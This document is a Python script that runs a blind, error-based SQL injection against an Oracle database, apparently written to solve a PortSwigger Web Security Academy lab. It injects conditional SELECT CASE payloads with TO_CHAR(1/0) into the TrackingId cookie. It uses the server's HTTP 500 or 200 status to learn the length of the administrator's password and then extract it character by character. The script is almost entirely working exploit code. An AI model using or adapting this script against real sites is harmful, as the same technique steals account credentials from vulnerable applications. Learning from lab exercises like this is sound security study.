#ORACLE DB
from pwn import * 
import requests,signal,time,pdb,sys,string

def def_handler(sig,frame):
    print("\n\n[!] Stopping Hack...\n")
    sys.exit(1)

signal.signal(signal.SIGINT,def_handler)

url="https://0a7c008e03dce7fb81e2daff00f00042.web-security-academy.net/filter?category=Pets"
characters = string.ascii_lowercase + string.digits

def makeRequest():
    p1 = log.progress("Hacking")
    p1.status("Start Hacking...")

    time.sleep(2)
    password = ""
    for number in range(0,30):
        cookies1 = {
                    'TrackingId': "FqKJEiG92xyn595n'||(SELECT CASE WHEN (LENGTH(password)>=%i) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username ='administrator')||'" % (number),
                    'session': "dXpZkXjzPWVpLhMgQo7huaS8xk40XQqh"
                }
        http=requests.get(url,cookies=cookies1)
        p1.status(cookies1['TrackingId'])
        if http.status_code == 200:
            pass_lenght = number -1
            break
            
    print("Password lenght: %i" % (pass_lenght))
    p2 = log.progress("Password")
    for position in range(1 ,number):
        for character in characters:
            cookies2 = {
                'TrackingId': "FqKJEiG92xyn595n'||(SELECT CASE WHEN (substr(password,%i,1)='%s') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username ='administrator')||'"% (position,character),
                'session': "dXpZkXjzPWVpLhMgQo7huaS8xk40XQqh"
            }
            r = requests.get(url,cookies=cookies2)
            p1.status(cookies2['TrackingId'])
            p2.status(password)
            print(r.status_code)

            if r.status_code == 500:
                password += character
                break
    print("The password is: %s" % password)

if __name__ == "__main__":
    makeRequest()
